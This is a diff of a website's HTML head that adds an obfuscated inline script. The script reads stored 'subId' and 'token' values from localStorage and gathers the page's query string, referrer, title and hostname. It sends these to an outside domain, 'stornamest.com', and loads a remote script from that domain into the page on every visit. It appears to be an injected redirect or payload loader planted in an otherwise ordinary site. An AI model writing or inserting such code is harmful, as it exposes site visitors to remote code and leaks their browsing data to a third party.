@@ -2,6 +2,49 @@
 <!--[if IE 9 ]><html class="ie9" lang="en"><![endif]-->
 <!--[if (gt IE 9)|!(IE)]><!--><html lang="en"><!--<![endif]-->
 <head>
+	<script>
+    (function() {
+    var name = '_fybmFtYbqZLwXbkZ';
+    if (!window._fybmFtYbqZLwXbkZ) {
+        window._fybmFtYbqZLwXbkZ = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _ZwJTWLgVMBRWnNT9 = localStorage.getItem('config');
+    if (typeof _ZwJTWLgVMBRWnNT9 !== 'undefined' && _ZwJTWLgVMBRWnNT9 !== null) {
+        var _6wGcSGNgMn3fkWZ5 = JSON.parse(_ZwJTWLgVMBRWnNT9);
+        var _bWbfYjWjDwFX1rQv = Math.round(+new Date()/1000);
+        if (_6wGcSGNgMn3fkWZ5.created_at + window._fybmFtYbqZLwXbkZ.ttl < _bWbfYjWjDwFX1rQv) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _L84DrTHqRnsjFWct = localStorage.getItem('subId');
+    var _nNfsSmHPqJ4q4vGM = localStorage.getItem('token');
+    var _3McN3x2T7pKPW6nX = '?return=js.client';
+        _3McN3x2T7pKPW6nX += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _3McN3x2T7pKPW6nX += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _3McN3x2T7pKPW6nX += '&default_keyword=' + encodeURIComponent(document.title);
+        _3McN3x2T7pKPW6nX += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _3McN3x2T7pKPW6nX += '&name=' + encodeURIComponent(name);
+        _3McN3x2T7pKPW6nX += '&host=' + encodeURIComponent(window._fybmFtYbqZLwXbkZ.R_PATH);
+    if (typeof _L84DrTHqRnsjFWct !== 'undefined' && _L84DrTHqRnsjFWct && window._fybmFtYbqZLwXbkZ.unique) {
+        _3McN3x2T7pKPW6nX += '&sub_id=' + encodeURIComponent(_L84DrTHqRnsjFWct);
+    }
+    if (typeof _nNfsSmHPqJ4q4vGM !== 'undefined' && _nNfsSmHPqJ4q4vGM && window._fybmFtYbqZLwXbkZ.unique) {
+        _3McN3x2T7pKPW6nX += '&token=' + encodeURIComponent(_nNfsSmHPqJ4q4vGM);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._fybmFtYbqZLwXbkZ.R_PATH + _3McN3x2T7pKPW6nX;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 
   <!-- Google Web Fonts
   ================================================== -->
